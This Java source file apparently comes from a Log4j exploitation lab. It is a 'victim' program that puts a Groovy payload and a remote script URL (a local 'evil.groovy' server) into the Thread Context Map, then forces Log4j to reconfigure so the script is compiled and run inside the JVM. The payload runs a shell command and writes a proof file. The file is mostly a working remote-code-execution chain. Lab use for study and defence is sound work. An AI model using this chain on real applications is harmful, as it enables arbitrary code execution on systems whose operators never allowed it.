package lab;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.ThreadContext;

/**
 * Victim for the script chain: the configuration interpolates a lookup into a script
 * source or script path. The attacker controls the Thread Context Map value; Log4j
 * evaluates it when the configuration is (re)loaded, then compiles and runs the script
 * inside the application JVM.
 */
public final class VictimScript {

    private static final String GROOVY_PAYLOAD =
            "def proc = 'id'.execute()\n"
                    + "proc.waitFor()\n"
                    + "def sb = new StringBuffer()\n"
                    + "proc.in.eachLine { sb << it + '\\n' }\n"
                    + "def pid = ProcessHandle.current().pid()\n"
                    + "def who = System.getProperty('user.name')\n"
                    + "def proof = new File('/tmp/log4j-lab-pwned.txt')\n"
                    + "proof.text = 'RCE via log4j script (config-time lookup evaluation) as ' + who + ' pid=' + pid + '\\n' + sb.toString()\n"
                    + "println '=== PAYLOAD EXECUTED IN VICTIM JVM (script) ==='\n"
                    + "println proof.text\n"
                    + "println '=== END PAYLOAD ==='\n"
                    + "true\n";

    public static void main(final String[] args) {
        final Logger log = LogManager.getLogger("victim"); // configuration load #1 (MDC empty)
        final String scriptUrl = args.length > 0 ? args[0] : "http://127.0.0.1:8001/evil.groovy";
        ThreadContext.put("scriptText", GROOVY_PAYLOAD);
        ThreadContext.put("scriptPath", scriptUrl);
        try {
            org.apache.logging.log4j.core.config.Configurator.reconfigure(); // configuration load #2
        } catch (final Throwable t) {
            System.out.println("reconfigure failed: " + t);
        }
        log.info("request handled"); // the ScriptFilter evaluates the script
        ThreadContext.clearMap();
        System.out.println("VICTIM: logged, scriptPath=" + scriptUrl);
    }

    private VictimScript() {}
}
